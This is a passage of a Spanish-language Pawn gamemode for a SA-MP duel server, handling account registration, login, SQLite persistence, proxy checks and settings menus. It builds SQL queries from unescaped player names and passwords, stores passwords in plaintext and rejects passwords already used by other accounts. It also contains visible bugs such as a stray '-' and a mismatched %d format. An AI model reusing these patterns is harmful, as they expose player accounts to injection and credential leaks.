				format(Texto, sizeof(Texto), "> {FFFFFF}%s {C9C9C9}intentÛ poner la RCON pero fallÛ.", obtenerNick(i));
		    	SendClientMessageToAll(COLOR_NEUTRO, Texto);
                Kick(i);
            }
        }
    }
    return 1;
}

public registrarDatos(playerid)
{
	new Consulta[2000], str[100], diaActual, mesActual, yearActual, skinGenerado = random(300);
	getdate(yearActual, mesActual, diaActual);
    format(Consulta, sizeof(Consulta), "INSERT INTO Cuentas (Nombre, Password, Ip, Admin, Mute, Pais, Skin, mensajesPrivados, invitacionDuelos, ");
    strcat(Consulta, "infoDamage, mostrarTab, mostrarFpsPing, sonidoCampana, tipoCampana, Clima, Hora, Dia, Mes, Year, ");
    strcat(Consulta, "puntajeEquipo, puntajeSolo, duelosGanados, duelosPerdidos) VALUES ");
    format(str, sizeof(str), "('%s',", obtenerNick(playerid));			strcat(Consulta, str); //nombre
    format(str, sizeof(str), "'%s',", Jugador[playerid][Password]);     strcat(Consulta, str); //contra
    format(str, sizeof(str), "'%s',", obtenerIp(playerid));     		strcat(Consulta, str); //ip
    format(str, sizeof(str), "0,");     								strcat(Consulta, str); //admin
    format(str, sizeof(str), "0,");     								strcat(Consulta, str); //mute
    format(str, sizeof(str), "'%s',", Jugador[playerid][Pais]);     	strcat(Consulta, str); //pais
    format(str, sizeof(str), "%d,", skinGenerado);     					strcat(Consulta, str); //skin
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //mensajesPrivados
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //invitacionDuelos
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //infoDamage
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //mostrartab
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //mostrarFpsPing
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //sonidoCampana
    format(str, sizeof(str), "17802,");     							strcat(Consulta, str); //tipoCampana
    format(str, sizeof(str), "1,");     								strcat(Consulta, str); //clima
    format(str, sizeof(str), "12,");     								strcat(Consulta, str); //hora
    format(str, sizeof(str), "%d,", diaActual);     					strcat(Consulta, str); //dia
    format(str, sizeof(str), "%d,", mesActual);     					strcat(Consulta, str); //mes
    format(str, sizeof(str), "%d,", yearActual);     					strcat(Consulta, str); //aùo
    format(str, sizeof(str), "0,");     								strcat(Consulta, str); //puntajeEquipo
	format(str, sizeof(str), "0,");     								strcat(Consulta, str); //puntajeSolo
    format(str, sizeof(str), "0,");     								strcat(Consulta, str); //dganados
    format(str, sizeof(str), "0)");     								strcat(Consulta, str); //dperdidos
    db_query(Cuentas, Consulta);

	cargarClavePrimaria(playerid);
	Jugador[playerid][puntajeEquipo]	= 0;
	Jugador[playerid][puntajeSolo]		= 0;
	Jugador[playerid][Muteado] 			= 0;
    Jugador[playerid][Skin] 			= skinGenerado;
    Jugador[playerid][invitacionDuelos] = 1;
	Jugador[playerid][mensajesPrivados] = 1;
	Jugador[playerid][infoDamage] 		= 1;
	Jugador[playerid][mostrarTab] 		= 1;
	Jugador[playerid][mostrarFpsPing] 	= 1;
	Jugador[playerid][sonidoCampana] 	= 1;
	Jugador[playerid][tipoCampana] 		= 17802;
	Jugador[playerid][Clima] 			= 1;
	Jugador[playerid][Hora] 			= 12;
	SetPlayerScore(playerid, 0);
    return 1;
}

public cargarDatos(playerid)
{
	new DBResult:Resultado, Consulta[256];
	cargarClavePrimaria(playerid);
    format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Nombre = '%s'", obtenerNick(playerid));//Jugador[playerid][ID]
   	Resultado = db_query(Cuentas, Consulta);
   	if(db_num_rows(Resultado)){

			db_get_field_assoc(Resultado, "Pais", Jugador[playerid][Pais], 24);
			db_get_field_assoc(Resultado, "Nombre", Jugador[playerid][Nombre], 24);
        	Jugador[playerid][ID] 				= db_get_field_assoc_int(Resultado, "id");
        	Jugador[playerid][Admin] 			= db_get_field_assoc_int(Resultado, "Admin");
        	Jugador[playerid][Muteado] 			= db_get_field_assoc_int(Resultado, "Mute");
         	Jugador[playerid][Skin] 			= db_get_field_assoc_int(Resultado, "Skin");
         	Jugador[playerid][mensajesPrivados] = db_get_field_assoc_int(Resultado, "mensajesPrivados");
         	Jugador[playerid][invitacionDuelos] = db_get_field_assoc_int(Resultado, "invitacionDuelos");
         	Jugador[playerid][infoDamage] 		= db_get_field_assoc_int(Resultado, "infoDamage");
         	Jugador[playerid][mostrarTab] 		= db_get_field_assoc_int(Resultado, "mostrarTab");
			Jugador[playerid][mostrarFpsPing] 	= db_get_field_assoc_int(Resultado, "mostrarFpsPing");
         	Jugador[playerid][sonidoCampana] 	= db_get_field_assoc_int(Resultado, "sonidoCampana");
         	Jugador[playerid][tipoCampana] 		= db_get_field_assoc_int(Resultado, "tipoCampana");
         	Jugador[playerid][Clima] 			= db_get_field_assoc_int(Resultado, "Clima");
         	Jugador[playerid][Hora] 			= db_get_field_assoc_int(Resultado, "Hora");
         	Jugador[playerid][invitacionDuelos] = db_get_field_assoc_int(Resultado, "invitacionDuelos");
        	Jugador[playerid][puntajeEquipo] 	= db_get_field_assoc_int(Resultado, "puntajeEquipo");
        	Jugador[playerid][puntajeSolo] 		= db_get_field_assoc_int(Resultado, "puntajeSolo");
        	Jugador[playerid][duelosGanados] 	= db_get_field_assoc_int(Resultado, "duelosGanados");
        	Jugador[playerid][duelosPerdidos] 	= db_get_field_assoc_int(Resultado, "duelosPerdidos");
	}


	SetPlayerTime(playerid, Jugador[playerid][Hora], 0);
	SetPlayerWeather(playerid, Jugador[playerid][Clima]);
	SetPlayerScore(playerid, Jugador[playerid][puntajeSolo] + Jugador[playerid][puntajeEquipo]);
	SetPlayerSkin(playerid, Jugador[playerid][Skin]);
   	db_free_result(Resultado);

	if(Jugador[playerid][mostrarFpsPing] == 1)
		mostrarDrawFpsPing(playerid); 
	return 1;
}
forward guardarIp(playerid);
public guardarIp(playerid)
{
    new Consulta[500];
	format(Consulta, sizeof(Consulta), "UPDATE Cuentas SET Ip = '%s' WHERE Nombre = '%s'", obtenerIp(playerid), obtenerNick(playerid));
	db_query(Cuentas, Consulta);
    return 1;
}

public guardarDatos(playerid)
{
    new Consulta[2000], miniStr[200];
	format(miniStr, sizeof(miniStr), "UPDATE Cuentas SET Nombre = '%s', Password = '%s'", obtenerNick(playerid), Jugador[playerid][Password]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), ", puntajeEquipo = '%d', puntajeSolo = '%d'", Jugador[playerid][puntajeEquipo], Jugador[playerid][puntajeSolo]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), ", duelosGanados = '%d', duelosPerdidos = '%d'", Jugador[playerid][duelosGanados], Jugador[playerid][duelosPerdidos]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), ", Admin = '%d', Pais = '%s'", Jugador[playerid][Admin], Jugador[playerid][Pais]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), ", Skin = '%d', mensajesPrivados = '%d', invitacionDuelos = '%d'", Jugador[playerid][Skin], Jugador[playerid][mensajesPrivados], Jugador[playerid][invitacionDuelos]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), ", infoDamage = '%d', mostrarTab = '%d', mostrarFpsPing = '%d', sonidoCampana = '%d', tipoCampana = '%d'", Jugador[playerid][infoDamage], Jugador[playerid][mostrarTab], Jugador[playerid][mostrarFpsPing], Jugador[playerid][sonidoCampana], Jugador[playerid][tipoCampana]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), ", Clima = '%d', Hora = '%d', Mute = '%d' ", Jugador[playerid][Clima], Jugador[playerid][Hora], Jugador[playerid][Muteado]);
	strcat(Consulta, miniStr);
	format(miniStr, sizeof(miniStr), "WHERE Nombre = %d", obtenerNick(playerid));
	strcat(Consulta, miniStr);
	db_query(Cuentas, Consulta);
    return 1;
}

stock establecerVariablesIniciales(playerid){
	Equipo[playerid] = NULO;

	Jugador[playerid][Nombre] = obtenerNick(playerid);
	Jugador[playerid][eligiendoMundo] = true;
	Jugador[playerid][Congelado] = false;
	Jugador[playerid][Desbugeando] = false;
	Jugador[playerid][vidaInfinita] = false;
	Jugador[playerid][puedeCambiarNombre] = false;
	Jugador[playerid][mostrarMarcador] = true;
	Jugador[playerid][Adversion] = 0;
	Jugador[playerid][mundoAnterior] = 0;
	Jugador[playerid][Offset] = 10;
	

	configurarDrawHit(playerid);
	configurarDrawFpsPing(playerid);


	segundosTotalesHit[playerid][0] = -1;
	segundosTotalesHit[playerid][1] = -1;

	SetPlayerColor(playerid, COLOR_GRIS);

	resetConfiguracionDuelo(playerid);
}

public OnPlayerConnect(playerid)
{

	if(ipBaneado(obtenerIp(playerid)) || nombreBaneado(obtenerNick(playerid))){
		return mostrarDatosBaneo(playerid, obtenerNick(playerid));
	}

	if(estaUsandoOtraCuenta(playerid) && antiFake){
		return mostrarAntiFake(playerid, obtenerIp(playerid));
	}

	if(playerid > jugadoresConectados)
		jugadoresConectados = playerid;

	establecerVariablesIniciales(playerid);

	new str2[300];
    format(str2, sizeof(str2),"api.ipinfodb.com/v3/ip-country/?key=%s&ip=%s", APIKEY, obtenerIp(playerid));
    HTTP(playerid, HTTP_GET, str2, "", "obtenerPais");

	new str[60];
	format(str, sizeof str, "www.shroomery.org/ythan/proxycheck.php?ip=%s", obtenerIp(playerid));
	HTTP(playerid, HTTP_GET, str, "", "comprobarProxy");
    
	new Dialogo[200];
	if(cuentaRegistrada(playerid)){
 		cargarPassword(playerid);
  		format(Dialogo, sizeof(Dialogo),"{C9C9C9}Escribe tu contraseÒa para ingresar al servidor.\n\
		{C9C9C9}El servidor garantiza la confidencialidad y protecciÛn de tus datos.");
   		ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "{7C7C7C}Login", Dialogo, ">>", "X");
	}else{
		format(Dialogo, sizeof(Dialogo),"{C9C9C9}Registra tu cuenta para ingresar al servidor.\n\
		{C9C9C9}El servidor garantiza la confidencialidad y protecciÛn de tus datos.");
  		ShowPlayerDialog(playerid, D_REGISTRO, DIALOG_STYLE_PASSWORD, "{7C7C7C}Registro", Dialogo, ">>", "X");
	}


	/* [Faros de Las Venturas] */
    RemoveBuildingForPlayer(playerid, 1278, 1099.2656, 1283.3438, 23.9375, 0.25);
    RemoveBuildingForPlayer(playerid, 1278, 1175.7656, 1283.3438, 23.9375, 0.25);

	/* [SF Barco y Aeropuerto] */
    RemoveBuildingForPlayer(playerid, 3814, -1178.1016, -114.8281, 19.7656, 0.25);
    RemoveBuildingForPlayer(playerid, 3815, -1178.1016, -114.8281, 19.7656, 0.25);

	/* [San Fierro 2] */
	RemoveBuildingForPlayer(playerid, 10813, -1687.4141, -623.0234, 18.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 10815, -1608.8906, -494.8359, 13.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3816, -1438.4141, -529.6328, 21.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 3816, -1362.9844, -491.4922, 21.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 3817, -1438.4141, -529.6328, 21.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 3817, -1362.9844, -491.4922, 21.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 11373, -1608.8906, -494.8359, 13.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 1682, -1691.5859, -619.6953, 29.6172, 0.25);
	RemoveBuildingForPlayer(playerid, 10810, -1687.4141, -623.0234, 18.1484, 0.25);

	return 1;
}

public comprobarProxy(playerid, response_code, data[])
{
	if(response_code == 200){
		if(data[0] == 'Y'){
			new Texto[400];
			format(Texto, sizeof(Texto), "> {FFFFFF}%s {C9C9C9}ha sido expulsado por usar Proxy.", obtenerNick(playerid));
		    SendClientMessageToAll(COLOR_NEUTRO, Texto);
		    SetTimerEx("delayKick", 100, false, "i", playerid);
		}
	}
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	if(playerid == jugadoresConectados){
		warp:
		jugadoresConectados--;
		if(!IsPlayerConnected(jugadoresConectados) && jugadoresConectados > 0)
			goto warp;
	}

	if(tieneOponente(playerid))
	    actualizarOponente(idOponente(playerid));

	eliminarDrawFpsPing(playerid);
	actualizarJugadores(GetPlayerVirtualWorld(playerid), Equipo[playerid]);
	
	new Mensaje[180], razonesDesconexion[3][] = {"Crash/Timeout", "SaliÛ", "Kick/Ban"};
	format(Mensaje, sizeof(Mensaje), "{%06x}%s {C9C9C9}se desconectÛ ({7C7C7C}%s{C9C9C9}).", colorJugador(playerid), obtenerNick(playerid), razonesDesconexion[reason]);
	SendClientMessageToAll(COLOR_NEUTRO, Mensaje);
	
	CallLocalFunction("guardarDatos", "i", playerid);
	CallLocalFunction("resetearArray", "i", playerid);
	
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	TogglePlayerSpectating(playerid, 1);
    TogglePlayerSpectating(playerid, 0);
    return 1;
}

public detectorParametros(){
	ForPlayers(i){
		new numeroMundo = GetPlayerVirtualWorld(i);
		if(Equipo[i] != EQUIPO_ESPECTADOR && Equipo[i] != NULO && configuracionMundo[numeroMundo][Restriccion] == 1){
	    	new fpsDetectados = FPS2[i], pingDetectado = GetPlayerPing(i), Float:plDetectado = NetStats_PacketLossPercent(i);

	    	if(FPS2[i] < configuracionMundo[numeroMundo][fpsMinimo] && FPS2[i] != 0){
				new texto[250];
				format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}fue sacado de la partida por tener {FFFFFF}FPS {C9C9C9}bajos (%d).", numeroMundo, colorJugador(i), Jugador[i][Nombre], fpsDetectados);
				enviarATodos(numeroMundo, texto);
				moverAEspectador(numeroMundo, i);
	    	}
	    	if(pingDetectado > configuracionMundo[numeroMundo][pingMaximo]){
				new texto[250];
				format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}fue sacado de la partida por tener {FFFFFF}LATENCIA {C9C9C9}alta (%dms).", numeroMundo, colorJugador(i), Jugador[i][Nombre], pingDetectado);
				enviarATodos(numeroMundo, texto);
				moverAEspectador(numeroMundo, i);
	    	}
	    	if(plDetectado >=configuracionMundo[numeroMundo][plMaximo]){
				new texto[250];
				format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}fue sacado de la partida por tener mucha {FFFFFF}perdida de paquetes {C9C9C9} (%.2f).", numeroMundo, colorJugador(i), Jugador[i][Nombre], plDetectado);
				enviarATodos(numeroMundo, texto);
				moverAEspectador(numeroMundo, i);
	    	}
	    	/*
            Punto medio, en caso de poner rango maximo al alejarse del mapa para los jugadores.
      		new Float:xr = posicionesMapas[mapaJugador(i)][EQUIPO_ROJO][0], Float:yr = posicionesMapas[mapaJugador(i)][EQUIPO_ROJO][1], Float:zr = posicionesMapas[mapaJugador(i)][EQUIPO_ROJO][2],
				Float:xa = posicionesMapas[mapaJugador(i)][EQUIPO_AZUL][0],  Float:ya = posicionesMapas[mapaJugador(i)][EQUIPO_AZUL][1], Float:za = posicionesMapas[mapaJugador(i)][EQUIPO_AZUL][2];
				
	    	if(!IsPlayerInRangeOfPoint(i, configuracionMundo[numeroMundo][rangoMaximo], float(puntoMedio(xr, xa)), float(puntoMedio(yr, ya)), float(puntoMedio(zr, za)))){
				new texto[400];
				format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}ha sido spawneado por irse del rango (%.3f, %.3f, %.3f)", numeroMundo, colorJugador(i), Jugador[i][Nombre], float(puntoMedio(xr, xa)), float(puntoMedio(yr, ya)), float(puntoMedio(zr, za)));
				enviarATodos(numeroMundo, texto);
				SpawnPlayer(i);
	    	}*/
		}
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    switch(dialogid)
    {
		case PARTIDAS_REALIZADAS:
		{
			if(response){
				switch(listitem){
					case 0: return mostrarPartidasRealizadasSolo(playerid, Jugador[playerid][Offset]);
					case 1: return mostrarPartidasRealizadas(playerid);
				}
			}
		}

		case PARTIDAS_REALIZADAS_SOLO:
		{
			if(response){
				Jugador[playerid][Offset] += 10;
				return mostrarPartidasRealizadasSolo(playerid, Jugador[playerid][Offset]);
			}else{
				Jugador[playerid][Offset] = 10;
			}

		}
		case D_REGISTRO:
        {
        	if(!response)
				return Kick(playerid);

 			if(strlen(inputtext) < 4 || strlen(inputtext) > 20){
               	SendClientMessage(playerid, COLOR_ROJO, "La contraseÒa debe tener de 4 a 20 letras.");
        		return ShowPlayerDialog(playerid, D_REGISTRO, DIALOG_STYLE_PASSWORD, "{7C7C7C}Error de registro", "{FFBB00}La contraseÒa que introduciste es erronea.\n", ">>", "X");
			}

			if(existePassword(inputtext)){
               	SendClientMessage(playerid, COLOR_ROJO, "La contraseÒa ya existe en otra cuenta, por temas de seguridad introduce otra.");
        		return ShowPlayerDialog(playerid, D_REGISTRO, DIALOG_STYLE_PASSWORD, "{7C7C7C}Error de registro", "{FFBB00}La contraseÒa que introduciste es erronea.\n", ">>", "X");
			}

			format(Jugador[playerid][Password], 24, inputtext);
			CallLocalFunction("registrarDatos", "i", playerid);
			SendClientMessage(playerid, COLOR_NEUTRO, "Te has registrado correctamente, bienvenido al servidor.");
			SendClientMessage(playerid, COLOR_NEUTRO, "Los comandos del servidor lo puedes ver ac· /{FFFFFF}comandos{C9C9C9}.");
			mostrarMenuMundos(playerid);

        }

		case D_LOGIN:
		{
            if(!response)
				return Kick(playerid);

            if(isnull(inputtext) || !strcmp(inputtext, "0"))
				return ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "{7C7C7C}Error de logeo", "{FFBB00}La contraseÒa que introduciste es erronea.", ">>", "X");

		    if(!strcmp(Jugador[playerid][Password], inputtext, true, 24)){
				new Texto[256];
				format(Texto, sizeof(Texto), "> Bienvenido devuelta {FFFFFF}%s{C9C9C9}, disfruta del servidor.", obtenerNick(playerid));
				SendClientMessage(playerid, COLOR_NEUTRO, Texto);-
				CallLocalFunction("cargarDatos", "i", playerid);
				CallLocalFunction("guardarIp", "i", playerid);
				mostrarMenuMundos(playerid);
			}else
				return ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "{7C7C7C}Error de logeo", "{FFBB00}La contraseÒa que introduciste es erronea.", ">>", "X");
		}

		case D_MENU_MUNDOS:
		{
			if(!response)
				return mostrarMenuMundos(playerid);
			else{
				new mundoElegido = 0;
				switch(listitem){
					case 0: mundoElegido = 1;
					case 1: mundoElegido = 2;
					case 2: mundoElegido = 3;
					case 3: mundoElegido = 4;
				}
				actualizarJugadores(mundoElegido, EQUIPO_VERDE);
				actualizarJugadores(mundoElegido, EQUIPO_NARANJA);
				actualizarJugadores(mundoElegido, EQUIPO_ESPECTADOR);
				
				ocultarDatosPartida(playerid);
   				Jugador[playerid][eligiendoMundo] = false;
				SetPlayerVirtualWorld(playerid, mundoElegido);
				mostrarDatosPartida(playerid);
				mostrarMenuEquipos(playerid);
			}
		}

		case D_MENU_EQUIPOS:
		{
			if(!response){
			    return mostrarMenuEquipos(playerid);
			}else{
				new numeroMundo = GetPlayerVirtualWorld(playerid);
				if(configuracionMundo[numeroMundo][equiposBloqueados])
					return moverAEspectador(numeroMundo, playerid);
				else{
					switch(listitem){
						case 0: return moverANaranja(numeroMundo, playerid);
						case 1: return moverAVerde(numeroMundo, playerid);
						case 2: return moverAEspectador(numeroMundo, playerid);
					}
				}
			}
		}

		case D_INFO_PARTIDA_ACTUAL: if(response){ } else mostrarInfoPartidaActual(playerid);

		case D_MENU_CONFIGURACION:
		{
        	if(response){
        		switch(listitem){
        		    case 0:
					{
					    if(Jugador[playerid][mensajesPrivados] == 1)
							Jugador[playerid][mensajesPrivados] = 0;
						else
							Jugador[playerid][mensajesPrivados] = 1;
        		        return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 1:
					{
					    if(Jugador[playerid][invitacionDuelos] == 1)
							Jugador[playerid][invitacionDuelos] = 0;
						else
							Jugador[playerid][invitacionDuelos] = 1;
        		        return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 2:
					{
					    if(Jugador[playerid][mostrarFpsPing] == 1){
							Jugador[playerid][mostrarFpsPing] = 0;
							ocultarDrawFpsPing(playerid);
						}else{
							Jugador[playerid][mostrarFpsPing] = 1;
							mostrarDrawFpsPing(playerid);
						}
						return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 3:
					{
					    if(Jugador[playerid][mostrarMarcador]){
							Jugador[playerid][mostrarMarcador] = false;
							ocultarDatosPartida(playerid);
						}else{
							Jugador[playerid][mostrarMarcador] = true;
							mostrarDatosPartida(playerid);
						}
						return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 4:
					{
					    if(Jugador[playerid][infoDamage] == 1)
							Jugador[playerid][infoDamage] = 0;
						else
							Jugador[playerid][infoDamage] = 1;
        		        return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 5:
					{
					    if(Jugador[playerid][sonidoCampana] == 1)
							Jugador[playerid][sonidoCampana] = 0;
						else
							Jugador[playerid][sonidoCampana] = 1;
        		        return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 6: return mostrarMenuConfiguracionCampana(playerid);
        		    case 7:
					{
					    if(Jugador[playerid][mostrarTab] == 1)
							Jugador[playerid][mostrarTab] = 0;
						else
							Jugador[playerid][mostrarTab] = 1;
        		        return mostrarMenuConfiguracionJugador(playerid);
        		    }
        		    case 8: return mostrarMenuConfiguracionSkin(playerid);
					case 9: return mostrarMenuConfiguracionClima(playerid);
					case 10: return mostrarMenuConfiguracionHora(playerid);
				}
				CallLocalFunction("guardarDatos", "i", playerid);
			}else{}
				
		}
	
		case D_MENU_CONFIGURACION_CAMPANA:
		{
        	if(response){
        		switch(listitem){
        		    case 0: Jugador[playerid][tipoCampana] = 17802;
        		    case 1: Jugador[playerid][tipoCampana] = 1132;
        		    case 2: Jugador[playerid][tipoCampana] = 17804;
        		    case 3: Jugador[playerid][tipoCampana] = 6003;
        		    case 4: Jugador[playerid][tipoCampana] = 5205;
        		    case 5: Jugador[playerid][tipoCampana] = 5201;
        		    case 6:
					{
					    SendClientMessage(playerid, COLOR_ROJO, "> Si no suena, activa la radio.");
                        Jugador[playerid][tipoCampana] = 1;
					}
				}
				PlayerPlaySound(playerid, Jugador[playerid][tipoCampana] ,0.0,0.0,0.0);
				return mostrarMenuConfiguracionJugador(playerid);
			}else
				mostrarMenuConfiguracionJugador(playerid);
		}
		
		case D_MENU_CONFIGURACION_SKIN:
		{
        	if(response){
        	    if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionSkin(playerid);
        	    }

        	    new id = strval(inputtext);

        	    if(id > 311 || id < 0){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No existe ese n˙mero de Skin.");
					return mostrarMenuConfiguracionSkin(playerid);
				}
				
        	    if(id == Jugador[playerid][Skin]){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Ya tienes ese skin puesto.");
					return mostrarMenuConfiguracionSkin(playerid);
				}
				
				Jugador[playerid][Skin] = id;
				SetPlayerSkin(playerid, id);
				return mostrarMenuConfiguracionJugador(playerid);
			}else
				return mostrarMenuConfiguracionJugador(playerid);
		}
		
		case D_MENU_CONFIGURACION_CLIMA:
		{
        	if(response){
        	    if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionHora(playerid);
        	    }

        	    new id = strval(inputtext);

        	    if(id > 255 || id < 0){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No existe ese clima.");
					return mostrarMenuConfiguracionClima(playerid);
				}

				if(id == Jugador[playerid][Hora]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> Ya tienes ese clima puesto.");
					return mostrarMenuConfiguracionClima(playerid);
				}

				Jugador[playerid][Clima] = id;
				SetPlayerWeather(playerid, id);
				return mostrarMenuConfiguracionJugador(playerid);
			}else
				return mostrarMenuConfiguracionJugador(playerid);
		}
		
		case D_MENU_CONFIGURACION_HORA:
		{
        	if(response){
        	    if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionHora(playerid);
        	    }

        	    new id = strval(inputtext);
        	    
        	    if(id > 23 || id < 0){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No existe esa hora.");
					return mostrarMenuConfiguracionHora(playerid);
				}

				if(id == Jugador[playerid][Hora]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> Ya tienes esa hora puesto.");
					return mostrarMenuConfiguracionHora(playerid);
				}
				
				Jugador[playerid][Hora] = id;
				SetPlayerTime(playerid, id, 0);
				return mostrarMenuConfiguracionJugador(playerid);
			}else
				return mostrarMenuConfiguracionJugador(playerid);
		}

	case D_MENU_CONTROL_CUENTA:
	{
        if(response){
        	switch(listitem){
        		case 0: mostrarActivarNombre(playerid);
        		case 1: mostrarMenuControlCuentas(playerid);
			}
		}else{}
	}
	
	case D_MENU_CONTROL_CUENTA_ANOMBRE:
	{
        if(response){
			if(!esNumero(inputtext)){
				SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe una ID y no un texto.");
				return mostrarActivarNombre(playerid);
   			}

			new id = strval(inputtext);

			if(!existeJugador(id)){
				SendClientMessage(playerid, COLOR_AMARILLO, "> No existe un jugador con esa ID.");
				return mostrarActivarNombre(playerid);
			}

			if(id == playerid){
				SendClientMessage(playerid, COLOR_AMARILLO, "> No pongas tu misma ID, los admins pueden cambiar su nombre sin habilitarlo.");
				return mostrarActivarNombre(playerid);
			}
			if(Jugador[id][puedeCambiarNombre]){
				SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya tiene habilitado el cambio de nombre.");
				return mostrarActivarNombre(playerid);
			}

			new Texto[264];
			format(Texto, sizeof(Texto), "{%06x}%s{C9C9C9} ha activado el cambio de nombre para {%06x}%s{C9C9C9}.",
			colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(id), Jugador[id][Nombre]);
			SendClientMessageToAll(COLOR_NEUTRO, Texto);
			Jugador[id][puedeCambiarNombre] = true;
		}else
			return mostrarMenuControlCuentas(playerid);
		}

	case D_CAMBIAR_NOMBRE:
	{
        if(response){
			if(isnull(inputtext) || !strcmp(inputtext, "0")){
				SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe el nombre por lo menos.");
				return mostrarCambioNombre(playerid);
   			}
   				
			if(existeNombre(inputtext)){
				SendClientMessage(playerid, COLOR_AMARILLO, "> Ya existe ese nombre registrado, usa otro.");
				return mostrarCambioNombre(playerid);
			}
				
			if(strlen(inputtext) < 4 || strlen(inputtext) > 24){
				SendClientMessage(playerid, COLOR_AMARILLO, "> El nombre no tiene que ser menor a 4 letras ni mayor a 24 letras.");
				return mostrarCambioNombre(playerid);
			}
			new nombreAnterior[MAX_PLAYER_NAME];
			GetPlayerName(playerid, nombreAnterior, sizeof(nombreAnterior));
			SetPlayerName(playerid, inputtext);
			Jugador[playerid][Nombre] = obtenerNick(playerid);
    		new query[300];
			format(query, sizeof(query), "UPDATE Cuentas SET Nombre = '%s' WHERE id = %d", inputtext, Jugador[playerid][ID]);
            db_query(Cuentas, query);
                
            Jugador[playerid][puedeCambiarNombre] = false;
			new Texto[264];
			format(Texto, sizeof(Texto), "{%06x}%s{C9C9C9} ha cambiado su nombre a {FFFFFF}%s{C9C9C9}.", colorJugador(playerid), nombreAnterior, inputtext);
			SendClientMessageToAll(COLOR_NEUTRO, Texto);
			PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
		}else{}
	}
	case D_MENU_CONFIGURACION_PARTIDA:
		{
        	if(response){
        		switch(listitem){
        		    case 0: return mostrarMenuConfiguracionMapa(playerid);
        		    case 1: return mostrarMenuConfiguracionArma(playerid);
					case 2: return mostrarMenuConfiguracionPM(playerid); //PM: puntajeMaximo
					case 3: return mostrarMenuConfiguracionRM(playerid); //RM: rondaMaxima
					case 4: return mostrarMenuConfiguracionPR(playerid); //PR: puntajeNaranja
					case 5: return mostrarMenuConfiguracionRR(playerid); //RR: rondasNaranja
					case 6: return mostrarMenuConfiguracionPA(playerid); //PR: puntajeVerde
					case 7: return mostrarMenuConfiguracionRA(playerid); //RA: rondasVerde
					case 8: return mostrarMenuConfiguracionPP(playerid); //PP: paquetes perdidos
					case 9: return mostrarMenuConfiguracionFPS(playerid); 
					case 10: return mostrarMenuConfiguracionPING(playerid);
					case 11:
					{
						new Texto[200];
						if(configuracionMundo[GetPlayerVirtualWorld(playerid)][Restriccion] == 1){
							configuracionMundo[GetPlayerVirtualWorld(playerid)][Restriccion] = 0;
							format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}desactivÛ la restricciÛn de conexiÛn.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
						}else{
							configuracionMundo[GetPlayerVirtualWorld(playerid)][Restriccion] = 1;
							format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}activo la restricciÛn de conexiÛn.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
						}
						enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
						return mostrarMenuConfiguracionPartida(playerid);
					}
					case 12:
					{
						new Texto[200];
						if(configuracionMundo[GetPlayerVirtualWorld(playerid)][equiposBloqueados]){
							configuracionMundo[GetPlayerVirtualWorld(playerid)][equiposBloqueados] = false;
